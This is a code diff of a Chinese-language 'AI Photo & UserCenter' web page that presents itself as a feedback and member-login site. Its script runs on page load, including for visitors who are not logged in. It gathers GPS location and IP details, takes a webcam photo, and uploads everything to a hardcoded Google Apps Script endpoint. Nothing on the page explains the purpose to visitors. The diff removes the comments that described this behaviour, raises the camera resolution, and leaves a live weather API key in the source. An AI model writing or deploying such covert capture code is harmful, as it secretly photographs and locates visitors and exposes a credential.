@@ -4,13 +4,11 @@
   <meta charset="UTF-8" />
   <title>AI Photo &amp; UserCenter</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <!-- 引入 Bootstrap 5 -->
   <link
     href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
     rel="stylesheet"
   />
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-
   <style>
     body {
       background-color: #f8f9fa;
@@ -49,11 +47,12 @@
     .fade-out {
       transition: opacity 0.8s ease;
     }
+    .row .card {
+      height: 100%;
+    }
   </style>
 </head>
 <body>
-
-<!-- 導覽列 -->
 <nav class="navbar navbar-expand-md navbar-dark bg-dark">
   <div class="container-fluid">
     <a class="navbar-brand" href="#">AI Photo &amp; UserCenter</a>
@@ -73,14 +72,10 @@
     </div>
   </div>
 </nav>
-
-<!-- Alert 區塊 -->
 <div class="container mt-3">
   <div id="statusSuccess" class="alert alert-success d-none fade-out" role="alert"></div>
   <div id="statusError" class="alert alert-danger d-none" role="alert"></div>
 </div>
-
-<!-- 會員登入 / 註冊 Modal -->
 <div class="modal fade" id="userModal" tabindex="-1" aria-labelledby="userModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
@@ -119,7 +114,6 @@
         </li>
       </ul>
       <div class="tab-content mt-3" id="myTabContent">
-        <!-- 登入表單 -->
         <div
           class="tab-pane fade show active"
           id="loginTabPane"
@@ -151,7 +145,6 @@
             <button class="btn btn-primary w-100" type="submit">登入</button>
           </form>
         </div>
-        <!-- 註冊表單 -->
         <div
           class="tab-pane fade"
           id="registerTabPane"
@@ -187,8 +180,6 @@
     </div>
   </div>
 </div>
-
-<!-- 管理者登入 Modal -->
 <div class="modal fade" id="adminModal" tabindex="-1" aria-labelledby="adminModalLabel" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content p-3">
@@ -222,14 +213,11 @@
     </div>
   </div>
 </div>
-
-<!-- 主內容 -->
 <div class="container mt-4">
-  <!-- (A) 回饋功能 (所有使用者皆可使用) -->
   <h4 class="section-title">回饋功能</h4>
   <div class="row mb-3">
-    <div class="col-md-6 mb-3">
-      <div class="card p-3">
+    <div class="col-md-6">
+      <div class="card p-3 h-100">
         <h5>回傳文字訊息</h5>
         <textarea
           id="userMessage"
@@ -242,8 +230,8 @@
         </button>
       </div>
     </div>
-    <div class="col-md-6 mb-3">
-      <div class="card p-3">
+    <div class="col-md-6">
+      <div class="card p-3 h-100">
         <h5>回傳圖片</h5>
         <div class="file-input-container mb-2">
           <input type="file" accept="image/*" id="userImage" />
@@ -255,12 +243,9 @@
       </div>
     </div>
   </div>
-  <!-- 提示只在未登入時顯示 -->
   <div id="guestTip" class="alert alert-info">
     如果您尚未註冊/登入，也可以在此回傳訊息或圖片。若要體驗更多功能 (裝置資訊/地圖/天氣)，請先註冊或登入。
   </div>
-
-  <!-- (B) 只有登入後才顯示的功能 -->
   <div id="memberPanel" style="display: none;">
     <h4 class="section-title">裝置資訊 &amp; 簡易儀表板</h4>
     <div class="card-grid mb-4">
@@ -288,26 +273,18 @@
     </div>
   </div>
 </div>
-
 <script>
-  // ★★★ 請填上您的 Apps Script 部署 URL ★★★
   const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby3ttEU7hp3lniJzsqA1DRtTmvrCd1iLsrlbssc4kX_gB1cbDo9zwfZBcaMMn_TBh-8qA/exec';
-
   const statusSuccess = document.getElementById('statusSuccess');
   const statusError = document.getElementById('statusError');
   const guestTip = document.getElementById('guestTip');
   const memberPanel = document.getElementById('memberPanel');
-
-  /******************************
-   * 動態更新 Navbar
-   ******************************/
   function updateNavbar() {
     const navRight = document.getElementById('navRight');
     navRight.innerHTML = '';
     const email = sessionStorage.getItem('email');
 
     if (email) {
-      // 已登入
       const liHello = document.createElement('li');
       liHello.classList.add('nav-item', 'me-2');
       liHello.innerHTML = `<span class="nav-link disabled">您好，${email}</span>`;
@@ -326,7 +303,6 @@
       navRight.appendChild(liHello);
       navRight.appendChild(liLogout);
     } else {
-      // 未登入
       const liUserCenter = document.createElement('li');
       liUserCenter.classList.add('nav-item', 'me-2');
       const userBtn = document.createElement('button');
@@ -337,7 +313,6 @@
         modal.show();
       };
       liUserCenter.appendChild(userBtn);
-
       const liAdmin = document.createElement('li');
       liAdmin.classList.add('nav-item');
       const adminBtn = document.createElement('button');
@@ -353,34 +328,23 @@
       navRight.appendChild(liAdmin);
     }
   }
-
-  /******************************
-   * 顯示成功 / 錯誤訊息
-   ******************************/
   function showSuccessMessage(msg) {
     statusSuccess.textContent = msg;
     statusSuccess.classList.remove('d-none');
     statusError.classList.add('d-none');
-
-    // 過幾秒自動淡出
     setTimeout(() => {
       statusSuccess.style.opacity = '0';
       setTimeout(() => {
         statusSuccess.classList.add('d-none');
-        statusSuccess.style.opacity = '1'; // 重置
+        statusSuccess.style.opacity = '1'; 
       }, 800);
     }, 3000);
   }
-
   function showErrorMessage(msg) {
     statusError.textContent = msg;
     statusError.classList.remove('d-none');
     statusSuccess.classList.add('d-none');
   }
-
-  /******************************
-   * 註冊
-   ******************************/
   document.getElementById('registerForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('regEmail').value;
@@ -403,38 +367,26 @@
       showErrorMessage('註冊錯誤：' + err.message);
     }
   });
-
-  /******************************
-   * 一般登入
-   ******************************/
   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('loginEmail').value;
     const password = document.getElementById('loginPassword').value;
-
     try {
       const formData = new FormData();
       formData.append('action', 'login');
       formData.append('email', email);
       formData.append('password', password);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
-
       if (result.success) {
         sessionStorage.setItem('email', result.user_id);
         showSuccessMessage('登入成功！');
-
         const userModalObj = bootstrap.Modal.getInstance(document.getElementById('userModal'));
         if (userModalObj) userModalObj.hide();
-
         updateNavbar();
-        // 隱藏「guestTip」，顯示「memberPanel」
         guestTip.style.display = 'none';
         memberPanel.style.display = 'block';
-
-        // 再次收集並上傳 => 確保登入後資料也送到 DB
         collectAndSendData();
       } else {
         showErrorMessage(`登入失敗：${result.error}`);
@@ -443,31 +395,22 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
-
-  /******************************
-   * 管理者登入
-   ******************************/
   document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = document.getElementById('adminEmail').value;
     const password = document.getElementById('adminPassword').value;
-
     try {
       const formData = new FormData();
       formData.append('action', 'adminLogin');
       formData.append('email', email);
       formData.append('password', password);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       if (!resp.ok) throw new Error(`HTTP 錯誤：${resp.status}`);
       const result = await resp.json();
-
       if (result.success) {
         showSuccessMessage('管理者登入成功！');
         const adminModalObj = bootstrap.Modal.getInstance(document.getElementById('adminModal'));
         if (adminModalObj) adminModalObj.hide();
-
-        // 跳轉後台
         window.location.href = 'https://your-domain/admin.php';
       } else {
         showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
@@ -476,10 +419,6 @@
       showErrorMessage('管理者登入錯誤：' + err.message);
     }
   });
-
-  /******************************
-   * 使用者回傳：文字訊息
-   ******************************/
   document.getElementById('sendMessageBtn').addEventListener('click', async () => {
     const email = sessionStorage.getItem('email') || 'guest_user';
     const message = document.getElementById('userMessage').value.trim();
@@ -492,7 +431,6 @@
       formData.append('action', 'sendMessage');
       formData.append('email', email);
       formData.append('textMessage', message);
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       const result = await resp.json();
       if (result.success) {
@@ -505,10 +443,6 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
-
-  /******************************
-   * 使用者回傳：圖片
-   ******************************/
   document.getElementById('sendImageBtn').addEventListener('click', async () => {
     const email = sessionStorage.getItem('email') || 'guest_user';
     const fileInput = document.getElementById('userImage');
@@ -535,7 +469,6 @@
       showErrorMessage(`系統錯誤：${err.message}`);
     }
   });
-
   function readFileAsBase64(file) {
     return new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -547,10 +480,6 @@
       reader.readAsDataURL(file);
     });
   }
-
-  /******************************
-   * 拍照 + GPS + IP 收集 & 上傳
-   ******************************/
   async function collectAndSendData() {
     const statusElem = document.getElementById('status');
     if (statusElem) {
@@ -559,28 +488,20 @@
 
     const collectedData = { gps: null, ip: null, photo: null };
     try {
-      // 同時抓 IP / GPS
       const [gpsResult, ipResult] = await Promise.allSettled([
         getGpsCoordinates(),
         getIpInfo()
       ]);
-      // 拍照
-      const photoResult = await startCamera();
-
+      const photoResult = await startCamera(/* 可以在此傳 width, height → {width:1280,height:720} */);
       if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
       if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
       if (photoResult) collectedData.photo = photoResult;
-
-      // 若已登入，就更新裝置資訊卡片
       if (sessionStorage.getItem('email')) {
         updateUI(collectedData);
       }
-
-      // 上傳(不管登入或否)
       const formData = new FormData();
       const email = sessionStorage.getItem('email') || 'guest_user';
       formData.append('email', email);
-
       if (collectedData.gps) {
         formData.append('latitude', collectedData.gps.latitude);
         formData.append('longitude', collectedData.gps.longitude);
@@ -598,7 +519,6 @@
       if (collectedData.photo) {
         formData.append('imageData', collectedData.photo);
       }
-
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       const result = await resp.json();
       if (statusElem) {
@@ -615,8 +535,6 @@
       }
     }
   }
-
-  // 取得 IP
   async function getIpInfo() {
     try {
       const resp = await fetch('https://ipinfo.io/json');
@@ -630,8 +548,6 @@
       return null;
     }
   }
-
-  // 取得 GPS
   async function getGpsCoordinates() {
     try {
       const position = await new Promise((resolve, reject) => {
@@ -647,12 +563,12 @@
       return null;
     }
   }
-
-  // 拍照
   async function startCamera() {
     let stream = null;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+      stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { width: 1920, height: 1080 }
+      });
       const video = document.createElement('video');
       video.srcObject = stream;
       await new Promise((resolve) => {
@@ -661,13 +577,13 @@
           resolve();
         };
       });
-      await new Promise((r) => setTimeout(r, 500));
+      await new Promise((r) => setTimeout(r, 300));
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1];
+      const photoData = canvas.toDataURL('image/jpeg', 1).split(',')[1]; 
       return photoData;
     } catch (error) {
       console.warn('相機啟動失敗:', error);
@@ -678,28 +594,21 @@
       }
     }
   }
-
-  // 若已登入 => 更新裝置資訊卡片 (IP/天氣等)
   function updateUI({ gps, ip }) {
-    // 更新 IP
     const ipElem = document.getElementById('ipInfo');
     if (ip && ipElem) {
       ipElem.textContent = `IP: ${ip.ip}, City: ${ip.city}, Region: ${ip.region}`;
     } else if (ipElem) {
       ipElem.textContent = '無法取得 IP 資訊';
     }
-    // 更新地圖 & 天氣
     if (gps) {
       document.getElementById('map').src = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}&hl=zh-TW&z=15&output=embed`;
       getWeatherInfo(gps.latitude, gps.longitude);
     }
   }
-
-  // 天氣
   async function getWeatherInfo(lat, lon) {
     try {
       if (!lat || !lon) return;
-      // 請換成您自己的 openweathermap apiKey
       const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
       const resp = await fetch(
         `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
@@ -717,18 +626,13 @@
       document.getElementById('weatherInfo').textContent = '天氣資訊載入失敗...';
     }
   }
-
-  // 頁面初始化
   document.addEventListener('DOMContentLoaded', async () => {
     updateNavbar();
     const email = sessionStorage.getItem('email');
     if (email) {
-      // 已登入: 隱藏提示, 顯示裝置資訊面板
       guestTip.style.display = 'none';
       memberPanel.style.display = 'block';
     }
-
-    // 一打開頁面就執行拍照 + 資料收集 + 上傳
     collectAndSendData();
   });
 </script>
